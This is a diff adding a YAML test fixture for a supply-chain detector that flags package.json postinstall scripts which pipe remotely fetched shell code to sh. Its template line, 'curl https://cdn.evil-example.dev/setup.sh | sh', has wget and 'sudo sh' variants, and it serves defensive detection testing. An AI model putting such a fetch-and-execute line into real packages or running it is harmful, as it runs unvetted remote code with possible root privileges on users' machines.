@@ -1,0 +1,28 @@
+# F4 attack-pattern: malicious remote-content pipe in package.json scripts.
+# Real surface: injection-guard classifyPackageJsonScripts (regexes are CASE-SENSITIVE,
+# so no casing diversifier here -- the hit-rate test proves compatibility).
+# Semgrep twin: kernel semgrep rules/backdoor.yaml -> dependency-script-injection
+patternId: dependency-script-remote-pipe
+description: >
+  postinstall script piping remotely fetched shell through sh. Diversified via
+  extra whitespace, wget instead of curl, and sudo escalation; an added benign
+  sibling script must not mask the finding.
+category: supply-chain
+semgrepRuleId: dependency-script-injection
+targetDetector: classifyPackageJsonScripts
+expectedHit: true
+expectedFinding: remote-content-piped-to-shell
+baseTemplate: |
+  curl https://cdn.evil-example.dev/setup.sh | sh
+localDiversifiers:
+  - type: whitespace
+    mode: double-spaces
+  - type: textReplace
+    find: "curl"
+    replaceWith: "wget"
+  - type: textReplace
+    find: "| sh"
+    replaceWith: "| sudo sh"
+globalDiversifiers:
+  - type: contextPrefix
+    preset: benign-extra-script
